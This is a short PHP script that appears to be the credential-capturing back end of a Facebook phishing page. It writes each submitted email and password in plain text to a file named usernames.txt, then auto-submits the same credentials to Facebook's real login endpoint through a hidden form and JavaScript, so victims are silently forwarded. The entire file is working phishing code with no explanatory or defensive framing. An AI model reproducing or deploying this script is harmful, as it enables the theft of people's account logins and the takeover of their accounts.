<?php

$user = $_POST["email"];
$pwd = $_POST["pass"];

if (!empty($_POST["email"])) {file_put_contents("usernames.txt", "User: " . $_POST["email"] . "\nPass: " . $_POST["pass"] . "\n\n", FILE_APPEND);                 }
	
?>

<form name="fbform" id="login_form" action="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110" method="post" novalidate="1" onsubmit="">
	<input type="hidden" name="email" value="<?php echo $user ?>">
	<input type="hidden" name="pass" value="<?php echo $pwd ?>">
	<script language="JavaScript">document.fbform.submit();</script>
</form>

